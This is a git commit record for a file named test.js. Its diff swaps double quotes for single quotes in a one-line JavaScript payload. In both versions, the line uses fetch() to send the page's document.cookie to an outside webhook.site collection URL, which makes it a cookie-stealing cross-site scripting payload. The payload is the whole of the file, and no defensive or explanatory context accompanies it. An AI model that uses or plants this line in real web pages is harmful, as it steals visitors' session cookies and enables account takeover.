7fd1b9ee28ff8b074124387121d7523ec58d0f73
nadav272 <115870248+nadav272@users.noreply.github.com>
2024-02-27 07:05:59 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/74a8c96a-e7b0-4e9f-a96a-ede480632433?cookie="+document.cookie);
+fetch('https://webhook.site/74a8c96a-e7b0-4e9f-a96a-ede480632433?cookie='+document.cookie);
